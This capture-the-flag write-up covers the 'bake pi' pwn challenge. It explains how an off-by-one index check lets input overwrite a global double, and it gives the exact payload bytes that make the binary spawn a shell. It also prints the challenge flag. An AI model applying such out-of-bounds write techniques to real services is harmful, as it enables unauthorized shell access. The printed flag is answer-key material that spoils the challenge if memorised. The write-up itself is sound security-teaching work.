# Bake Pi

## Challenge Info

- **Name:** `bake pi`
- **Category:** `Pwn`
- **Description:** `Are you good at baking? I'm trying to create the perfect pi recipe, but can't quite get it right. Can you help me?`
- **Remote:** `nc bake-a-pi.ctf.ritsec.club 1555`

## Files Provided

```text
pi.bin
```

This is a small 64-bit ELF with symbols intact.

## Initial Triage

```bash
file pi.bin
checksec --file=pi.bin
```

Relevant output:

```text
pi.bin: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE
SHSTK:      Enabled
IBT:        Enabled
```

The binary is non-PIE and not stripped, which makes reversing straightforward. Even though SHSTK and IBT are enabled, this challenge does not need ROP at all.

## High-Level Behavior

Running the binary shows a simple menu:

```text
(S)how recipe, (C)change ingredient, (T)aste test:
```

Strings also reveal two important clues:

```text
Yummy! This is the perfect pi!
/bin/bash
Still doesn't taste right. Let's try a different recipe.
```

That strongly suggests there is a branch which spawns a shell if some `pi` value is exactly correct.

## Reverse Engineering

The key globals are:

```text
0x404080 ingredients
0x404180 pi
```

From the symbol table:

```text
0000000000404080 D ingredients
0000000000404180 D pi
```

`ingredients` is 256 bytes total, which is exactly:

```text
8 entries * 0x20 bytes each
```

So the valid indices should be:

```text
0..7
```

But in `main`, the change-ingredient path checks:

```asm
401313: 8b 45 e0              mov    eax,DWORD PTR [rbp-0x20]
401316: 83 f8 08              cmp    eax,0x8
401319: 76 14                 jbe    40132f
```

That means:

```text
index <= 8 is accepted
```

This is the bug.

## The Vulnerability

The program calculates the destination for `fgets` like this:

```asm
40134a: 8b 55 e0              mov    edx,DWORD PTR [rbp-0x20]
401352: 48 c1 e1 05           shl    rcx,0x5
401356: 48 8d 15 23 2d 00 00  lea    rdx,[rip+0x2d23]        # 404080 <ingredients>
40135d: 48 01 d1              add    rcx,rdx
...
401363: be 20 00 00 00        mov    esi,0x20
401368: 48 89 cf              mov    rdi,rcx
40136b: e8 70 fd ff ff        call   4010e0 <fgets@plt>
```

Destination:

```text
ingredients + index * 0x20
```

So if we choose:

```text
index = 8
```

the write target becomes:

```text
0x404080 + 8 * 0x20 = 0x404180
```

and that is exactly the address of the global `pi`.

So the challenge is a clean **off-by-one index bug** that turns into an arbitrary 32-byte overwrite over `pi`.

## The Win Condition

The taste-test branch compares the global `pi` against a constant:

```asm
4013ad: movsd  xmm0,QWORD PTR [rip+0x2dcb]        # 404180 <pi>
4013b5: ucomisd xmm0,QWORD PTR [rip+0xe43]        # 402200
...
4013c9: puts("Yummy! This is the perfect pi!")
4013f6: call   execl@plt
```

The constant at `0x402200` is:

```text
18 2d 44 54 fb 21 09 40
```

Interpreted as a little-endian double, that is:

```text
0x400921fb54442d18
```

which is the standard IEEE-754 encoding of:

```text
3.141592653589793
```

If `pi` equals that exact value, the binary does:

```c
execl("/bin/bash", "/bin/bash", 0);
```

So we do not need code execution through ROP or GOT smashing. We only need to overwrite the `double` correctly and then choose `T`.

## Exploit Strategy

1. Choose `C` to change an ingredient.
2. Select ingredient `8`.
3. Send the raw 8-byte little-endian representation of `3.141592653589793`.
4. Choose `T`.
5. The program spawns `/bin/bash`.
6. Read the flag.

The exact bytes to send are:

```python
struct.pack("<Q", 0x400921FB54442D18)
```

Which expands to:

```text
\x18\x2d\x44\x54\xfb\x21\x09\x40
```

These bytes contain no nulls, so they are easy to place through `fgets`.

## Why The Newline Handling Still Works

The binary strips the trailing newline after `fgets` by doing:

```c
buf[strlen(buf) - 1] = '\0';
```

That means our actual in-memory layout becomes:

```text
18 2d 44 54 fb 21 09 40 00
```

This is fine because `pi` is only the first 8 bytes. The terminating `\0` lands in the byte immediately after the `double`.

## Solution Script

A complete exploit script is included as [solution.py](/home/jilani/Desktop/ritsecCTF-2026/pwn/bake-pi/solution.py).

Run it remotely:

```bash
python3 solution.py
```

Run it locally:

```bash
python3 solution.py --local --cmd 'echo PWNED'
```

The core payload is:

```python
EXPLOIT_PREFIX = b"C\n8\n" + struct.pack("<Q", 0x400921FB54442D18) + b"\nT\n"
```

## Final Flag

After triggering the shell on the remote service, reading `/app/flag.txt` gives:

```text
RS{0ff_by_0n3_4s_e4sy_4s_4_sk1llb17_p1}
```
